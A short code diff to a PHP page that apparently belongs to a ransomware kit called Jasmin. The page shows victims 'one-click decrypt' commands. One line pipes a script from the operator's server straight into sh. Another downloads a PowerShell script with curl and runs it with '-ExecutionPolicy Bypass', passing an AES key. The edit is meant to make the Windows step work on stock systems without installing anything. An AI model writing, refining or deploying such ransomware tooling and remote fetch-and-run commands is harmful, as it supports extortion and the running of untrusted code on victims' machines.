@@ -34,9 +34,9 @@ wget -qO- <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>"<
 <div class="dt-content" id="dt-win">
 <h3>🖥️ Windows 一键解密</h3>
 <pre class="dt-code">:: 纯 PowerShell 实现，无需编译 exe
-:: 要求 PowerShell 7+   (未装可执行: winget install Microsoft.PowerShell)
+:: 要求 PowerShell 5.1+（Windows 10/11、Server 2016+ 系统自带，无需安装任何东西）
 curl.exe -sL <?=$srv?>/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
-pwsh -File jasmin_unlock.ps1 -Server <?=$srv?> -K "<?=$aes_pwd?>"
+powershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server <?=$srv?> -K "<?=$aes_pwd?>"
 :: 不写 -Paths 则解密全部加密文件（所有磁盘 + 常用用户目录）
 :: 也可只解指定目录：-Paths C:\data D:\work</pre>
 </div>
